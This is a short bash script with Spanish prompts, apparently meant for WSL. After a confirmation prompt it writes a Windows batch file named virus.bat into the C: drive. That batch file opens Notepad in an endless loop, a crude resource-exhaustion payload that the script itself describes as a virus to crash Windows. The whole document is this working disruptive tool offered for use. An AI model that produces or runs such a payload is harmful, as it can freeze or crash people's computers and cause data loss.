ruta=$(pwd)
read -p "esto creara un virus para colapsar windows en la carpeta c estas seguro de continuar?(y/n)DEFAULT=n" seguro
if [ $seguro == y ];then
cd /mnt/c
touch virus.bat
echo "" > virus.bat
echo '@echo off' > virus.bat
echo ':bucle' >> virus.bat
echo 'start notepad' >> virus.bat
echo 'goto bucle' >> virus.bat
sleep 2s
cd ${ruta}
echo listo
fi
